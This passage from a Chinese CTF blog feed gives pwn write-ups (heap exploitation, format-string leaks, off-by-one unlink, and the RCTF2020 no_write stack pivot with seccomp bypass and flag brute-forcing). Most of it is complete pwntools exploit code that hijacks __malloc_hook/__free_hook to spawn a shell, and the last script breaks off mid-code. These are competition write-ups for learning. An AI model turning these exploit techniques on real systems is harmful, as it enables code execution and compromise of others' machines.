class="string">"Command:"</span>,<span class="string">"1"</span>)</span><br><span class="line">    sl(<span class="string">"Size:"</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,cnt)</span>:</span></span><br><span class="line">    sl(<span class="string">"Command:"</span>,<span class="string">"2"</span>)</span><br><span class="line">    sl(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line">    sl(<span class="string">"Size:"</span>,str(size))</span><br><span class="line">    s(<span class="string">"Content:"</span>,cnt)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">"Command:"</span>,<span class="string">"3"</span>)</span><br><span class="line">    sl(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">"Command:"</span>,<span class="string">"4"</span>)</span><br><span class="line">    sl(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">'a'</span>*<span class="number">0x68</span>+p64(<span class="number">0xe1</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">3</span>,<span class="string">"123"</span>)</span><br><span class="line">add(<span class="number">0x500</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#6</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x600</span>)<span class="comment">#5</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x70</span>,<span class="number">0x68</span>*<span class="string">'b'</span>+p64(<span class="number">0x513</span>))</span><br><span class="line">add(<span class="number">0x500</span>)<span class="comment">#7</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content: \n"</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4fa8</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">malloc_hook = libc.sym[<span class="string">'__malloc_hook'</span>] + libc_base</span><br><span class="line">realloc = libc.sym[<span class="string">'realloc'</span>] + libc_base</span><br><span class="line">one = libc_base +<span class="number">0xf1147</span><span class="comment"># 0x4526a</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#8</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x1b</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(one)+p64(realloc+<span class="number">4</span>))</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb 2019 heap"></a>axb 2019 heap</h3><p>格式化字符串泄露程序基址和libc基址，off by one打unlink</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./axb_2019_heap")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25965</span>)</span><br><span class="line">elf = ELF(<span class="string">"./axb_2019_heap"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    sl(<span class="string">"10):"</span>,str(idx))</span><br><span class="line">    sl(<span class="string">"size:"</span>,str(size))</span><br><span class="line">    sl(<span class="string">"content:"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">    sl(<span class="string">"index:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">    sl(<span class="string">"index:"</span>,str(idx))</span><br><span class="line">    sl(<span class="string">"content:"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">"name:"</span>,<span class="string">"%14$p%15$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">elf_base = int(p.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x1200</span></span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">libc_base = int(p.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x20830</span></span><br><span class="line">log.success(<span class="string">"elf_base:"</span>+hex(elf_base))</span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>,<span class="string">'a'</span>*<span class="number">0x98</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x98</span>,<span class="string">'a'</span>*<span class="number">0x98</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(elf_base+<span class="number">0x202048</span>)+p64(elf_base+<span class="number">0x202050</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0x90</span>)+p8(<span class="number">0xa0</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(libc_base+libc.sym[<span class="string">'__free_hook'</span>])+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;roarctf-2019-easyheap&quot;&gt;&lt;a href=&quot;#roarctf-2019-easyheap&quot; class=&quot;headerlink&quot; title=&quot;roarctf 2019 easyheap&quot;&gt;&lt;/a&gt;roarctf 2019 easyheap&lt;/
      
    
    </summary>
    
      <category term="pwn学习" scheme="https://j-kangel.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="https://j-kangel.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>RCTF2020 部分pwn</title>
    <link href="https://j-kangel.github.io/2020/06/06/RCTF2020-pwn/"/>
    <id>https://j-kangel.github.io/2020/06/06/RCTF2020-pwn/</id>
    <published>2020-06-05T18:20:17.000Z</published>
    <updated>2020-06-06T11:39:50.300Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>比赛没时间打，赛后复现几道题目玩玩。</p><h3 id="no-write"><a href="#no-write" class="headerlink" title="no_write"></a>no_write</h3><p>这道题禁用了write，需要用到栈迁移配合__libc_start_mian来获取syscall以及gadget的多次利用</p><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>checksec，No PIE、No canary</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/mnt/hgfs/shared/RCTF/pwn/no_write_attachment/no_write&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>查看程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  init(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  read_n(&amp;v4, <span class="number">256</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经典的栈溢出，但是根据题目似乎是禁用了一些函数</p><p>seccomp查看沙箱机制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  no_write_attachment seccomp-tools dump ./no_write</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x06 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0010</span><br><span class="line"> 0004: 0x15 0x04 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>发现只能使用open、read、exit</p><p>此时可以想到，将flag读到bss段上，然后逐个字节爆破。那么问题来了，程序中只有read函数，没有open函数。因此可以进行系统调用，但是程序中不存在syscall，这是就需要得到syscall的地址。</p><p>我们发现在调用__libc_start_main时会在栈上留下syscall附近的地址，因此首先可以通过栈迁移将栈迁移到已知地址，例如bss段。这里可以利用<code>pop rbp；leave ret</code>进行栈迁移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">bss = <span class="number">0x601078</span></span><br><span class="line">leave_ret = <span class="number">0x40070b</span></span><br><span class="line">pop_rbp = <span class="number">0x400588</span></span><br><span class="line"><span class="comment">##stack pivot to bss</span></span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x18</span> + csu(read_got,<span class="number">0</span>,bss,<span class="number">0x580</span>)</span><br><span class="line">pay += p64(pop_rbp) + p64(bss+<span class="number">0x4f8</span>) + p64(leave_ret)</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img alt="" data-src="/2020/06/06/RCTF2020-pwn/RCTF2020-no-write/1.png" class="lazyload"></p><p>接下需要调用<code>__libc_start_main</code>函数，需要说明的是：</p><p>此时__libc_start_main函数的返回值为第一个参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##__libc_start_main</span></span><br><span class="line">pop_rdi = <span class="number">0x400773</span></span><br><span class="line">pop_rsp = <span class="number">0x40076d</span></span><br><span class="line">syscall = <span class="number">0x6014d8</span></span><br><span class="line">pay = <span class="string">'flag'</span></span><br><span class="line">pay += <span class="string">'\x00'</span>*(<span class="number">0x500</span>-len(pay))</span><br><span class="line">pay += csu(elf.got[<span class="string">'__libc_start_main'</span>],pop_rdi,<span class="number">0</span>,bss+<span class="number">0x20</span>)<span class="comment">#p64(0x400544)</span></span><br><span class="line">pay += <span class="string">'\x00'</span>*(<span class="number">0x580</span>-len(pay))</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img alt="" data-src="/2020/06/06/RCTF2020-pwn/RCTF2020-no-write/2.png" class="lazyload"></p><p>接下来的思路如下：</p><ol><li>将0x6014d8的最低字节改为’\x7f’，使之成为syscall地址</li><li>利用read的返回值改写rax的值为2，即open函数的系统调用号</li><li>将flag写入bss</li></ol><p>然后是爆破flag，可以利用__libc_csu_init中的gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400750 loc_400750:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000400750                 mov     rdx, r15</span><br><span class="line">.text:0000000000400753                 mov     rsi, r14</span><br><span class="line">.text:0000000000400756                 mov     edi, r13d</span><br><span class="line">.text:0000000000400759                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040075D                 add     rbx, 1</span><br><span class="line">.text:0000000000400761                 cmp     rbp, rbx</span><br><span class="line">.text:0000000000400764                 jnz     short loc_400750</span><br><span class="line">.text:0000000000400766</span><br><span class="line">.text:0000000000400766 loc_400766:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400766                 add     rsp, 8</span><br><span class="line">.text:000000000040076A                 pop     rbx</span><br><span class="line">.text:000000000040076B                 pop     rbp</span><br><span class="line">.text:000000000040076C                 pop     r12</span><br><span class="line">.text:000000000040076E                 pop     r13</span><br><span class="line">.text:0000000000400770                 pop     r14</span><br><span class="line">.text:0000000000400772                 pop     r15</span><br><span class="line">.text:0000000000400774                 retn</span><br></pre></td></tr></table></figure><p>具体思路如下：</p><ol><li>使rbp得值为flag单字节</li><li>使rbx为猜测值进行爆破</li><li>利用0x40075d处gadget进行比较</li></ol><p>完整exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(r12,r13,r14,r15)</span>:</span></span><br><span class="line">    pay = p64(<span class="number">0x40076a</span>)</span><br><span class="line">    pay += p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">    pay += p64(<span class="number">1</span>) <span class="comment">#rbp</span></span><br><span class="line">    pay += p64(r12) <span class="comment">#call_func</span></span><br><span class="line">    pay += p64(r13) <span class="comment">#edi</span></span><br><span class="line">    pay += p64(r14) <span class="comment">#rsi</span></span><br><span class="line">    pay += p64(r15) <span class="comment">#rdx</span></span><br><span class="line">    pay += p64(<span class="number">0x400750</span>)</span><br><span class="line">    pay += <span class="string">'\x00'</span>*<span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    i = <span class="number">47</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        p = process(<span class="string">"./no_write"</span>)</span><br><span class="line">        elf = ELF(<span class="string">"./no_write"</span>)</span><br><span class="line">        read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">        bss = <span class="number">0x601078</span></span><br><span class="line">        leave_ret = <span class="number">0x40070b</span></span><br><span class="line">        pop_rbp = <span class="number">0x400588</span></span><br><span class="line">        <span class="comment">##stack pivot to bss</span></span><br><span class="line">        pay = <span class="string">'a'</span>*<span class="number">0x18</span> + csu(read_got,<span class="number">0</span>,bss,<span class="number">0x580</span>)</span><br><span class="line">        pay += p64(pop_rbp) + p64(bss+<span class="number">0x4f8</span>) + p64(leave_ret)</span><br><span class="line">        p.send(pay)</span><br><span class="line">        <span class="comment">##__libc_start_main</span></span><br><span class="line">        pop_rdi = <span class="number">0x400773</span></span><br><span class="line">        pop_rsp = <span class="number">0x40076d</span></span><br><span class="line">        syscall = <span class="number">0x6014d8</span></span><br><span class="line">        pay = <span class="string">'flag'</span></span><br><span class="line">        pay += <span class="string">'\x00'</span>*(<span class="number">0x38</span>-len(pay))</span><br><span class="line">        pay += csu(read_got,<span class="number">0</span>,syscall,<span class="number">0x1</span>)</span><br><span class="line">        pay += csu(read_got,<span class="number">0</span>,bss+<span class="number">0x580</span>,<span class="number">0x2</span>)</span><br><span class="line">        pay += csu(syscall,bss,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">        flag_addr = <span class="number">0x601318</span></span><br><span class="line">        pay += csu(read_got,<span class="number">3</span>,bss+<span class="number">0x580</span>,j)</span><br><span class="line">        pay += csu(read_got,<span class="number">3</span>,flag_addr,<span class="number">0x1</span>)</span><br><span class="line">        pay += p64(<span class="number">0x40076a</span>) + p64(i) + p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">        pay += p64(<span class="number">0x40075d</span>) + p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">        pay += csu(read_got,<span class="number">0</span>,bss+<span class="number">0x580</span>,<span class="number">0x10</span>)*<span class="number">2</span></span><br><span class="line">        pay += <span class="string">'\x00'</span>*(<span class="number">0x480</span>-len(pay))</span><br><span class="line">        pay += p64(pop_rsp)+p64(<span class="number">0</span>)*<span class="number">0xf</span> + csu(elf.got[<span class="string">'__libc_start_main'</span>],pop_rdi,<span class="number">0</span>,bss+<span class="number">0x20</span>)</span><br><span class="line">        pay += <span class="string">'\x00'</span>*(<span class="number">0x580</span>-len(pay))</span><br><span class="line">        <span class="comment"># gdb.attach(p)</span></span><br><span class="line">        p.send(pay)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        p.send(<span class="string">'\x7f'</span>)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        p.send(<span class="string">'az'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sleep(<span class="number">0.5</span>)</span><br><span class="line">            p.send(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">            p.recv(<span class="number">1</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">            flag += chr(i+<span class="number">1</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                p.close()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        print(i)</span><br><span class="line">        print(flag)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">53</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这道题得难点在于栈帧的控制，需要不断地调试。</p><h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><p>这道题存在多处漏洞，负数索引、乘法溢出、堆溢出、off by null。这里利用较为简单的负数索引以及乘法溢出来get shell</p><h4 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h4><p>64位程序，保护全开。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000004008 off_4008        dq offset off_4008      ; DATA XREF: sub_1260+1B↑r</span><br><span class="line">.data:0000000000004008                                         ; .data:off_4008↓o</span><br><span class="line">.data:0000000000004010 qword_4010      dq 996h                 ; DATA XREF: add+C↑r</span><br><span class="line">.data:0000000000004010                                         ; add+AC↑r ...</span><br><span class="line">.data:0000000000004018 dword_4018      dd 1                    ; DATA XREF: sub_18D1+18↑r</span><br><span class="line">.data:0000000000004018                                         ; sub_18D1+27↑r ...</span><br><span class="line">.data:0000000000004018 _data           ends</span><br></pre></td></tr></table></figure><p>程序的所有索引都没有检查负数边界，因此可以直接溢出到0x4008处，索引为<code>-5</code></p><p>隐藏功能6会调用malloc，且大小为0x50，add函数则使用calloc</p><p>隐藏功能7有32字节溢出</p><p>具体思路如下：</p><ol><li>show(-5)泄露libc地址，计算出__free_hook和one_gadget</li><li>利用隐藏功能7修改tcache</li><li>利用隐藏功能6将__free_hook改为one_gadget</li></ol><p>完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./note"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./note"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.30.so"</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">    sl(<span class="string">"Choice:"</span>,<span class="string">"1"</span>)</span><br><span class="line">    sl(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line">    sl(<span class="string">"Size:"</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">"Choice"</span>,<span class="string">"2"</span>)</span><br><span class="line">    sl(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">"Choice:"</span>,<span class="string">"3"</span>)</span><br><span class="line">    sl(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span 